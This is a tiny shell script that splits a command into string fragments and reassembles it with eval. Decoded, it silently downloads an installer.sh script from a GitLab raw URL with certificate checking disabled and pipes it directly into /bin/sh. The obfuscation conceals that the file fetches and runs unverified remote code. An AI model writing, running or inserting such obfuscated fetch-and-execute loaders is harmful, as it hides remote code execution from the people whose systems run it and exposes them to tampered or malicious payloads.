z="
";Bz=' -q ';Tz='aw/m';Cz='"--n';Yz=' -O ';Jz='ps:/';Lz='lab.';Kz='/git';az='/bin';Ez='eck-';Iz=' htt';Uz='ain/';Qz='eamn';Zz='- | ';Xz='r.sh';Hz='ate"';Sz='/-/r';Dz='o-ch';Gz='ific';bz='/sh';Vz='inst';Az='wget';Pz='l1/t';Wz='alle';Nz='emil';Mz='com/';Oz='nabi';Fz='cert';Rz='itro';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz"